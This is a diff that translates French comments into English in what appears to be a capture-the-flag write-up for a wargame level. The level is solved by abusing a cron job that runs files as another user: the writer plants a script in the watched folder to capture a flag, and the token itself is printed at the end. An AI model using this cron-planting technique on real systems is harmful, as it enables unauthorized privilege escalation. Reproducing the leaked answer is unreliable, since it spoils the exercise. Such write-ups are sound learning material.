@@ -1,11 +1,12 @@
 #A notre arrive sur la session, un message "You have a new mail" apparait
+#When we get on this level, a message "You have a new mail" appears
 
 cd /var/mail
 cat level05
 >>> */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
 
-#On voit que le contenu de ce mail est une tache chronique executer par flag05
-#il faut donc maintenant voir ce qu'elle execute, openarenaserver n'etant pas une commande built-in elle ne dispose pas de man
+#The content seems to be a chrontab executed by flag05
+#lets see what openarenaserver actually do 
 
 cat /usr/sbin/openarenaserver
 
@@ -17,18 +18,18 @@ for i in /opt/openarenaserver/* ; do
 	rm -f "$i"
 done
 
-#On voit que le script execute avec bash -x tout les fichier present dans /opt/openarenaserver/
-#Je decide donc d'ecrire un petit script dans mon dossier tmp
+#This little script execute (as flag05) everything in /opt/openarenaserver/ and delete it right after
+#So we just have to write a little script in an sh file and move it in this folder
 
 cat troll.sh
 >>> echo `getflag` > /tmp/azur/out
 
-#Et ensuite je le copie dans le dossier de la cron task sans oublier de donner les droits d'ecriture dans mon dossier
+#Then I use chmod on my file to set execution right and i copy my file into the /opt/openarenaserver/ folder 
 
 chmod 777 /tmp/azur
 cp /tmp/azur/troll.sh /opt/openarenaserver
 
-#Il nous reste plus qu'a attendre 2 minutes (car la cron task s'execute toute les deux minutes) et cat le fichier de sortie
+#Lets wait around 2 minutes (cause crontab execute every 2 min) and cat the out file
 
 cat /tmp/azur/out
 >>> Check flag.Here is your token : viuaaale9huek52boumoomioc
